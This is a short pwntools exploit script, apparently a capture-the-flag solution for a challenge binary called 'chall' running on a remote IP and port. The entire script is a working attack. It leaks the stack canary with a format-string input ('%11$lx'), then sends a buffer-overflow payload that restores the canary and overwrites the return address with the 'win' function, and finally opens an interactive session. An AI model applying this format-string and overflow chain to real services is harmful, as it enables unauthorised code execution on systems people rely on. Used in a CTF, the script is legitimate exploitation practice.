from pwn import *
from pwn import p64

local = False

exe = context.binary = ELF("./chall")
win = exe.symbols["win"]

if local:
    p = process("./chall")
else:
    host, port = "34.101.174.85", 10002
    p = remote(host, port)


p.recvuntil(b"> ")
p.sendline("%11$lx".encode())

canary = int(p.recvline().decode().strip(), 16)

payload = b"A" * 40 + p64(canary) + b"A" * 8 + p64(win)

p.recvuntil(b"> ")
p.sendline(payload)

p.interactive()
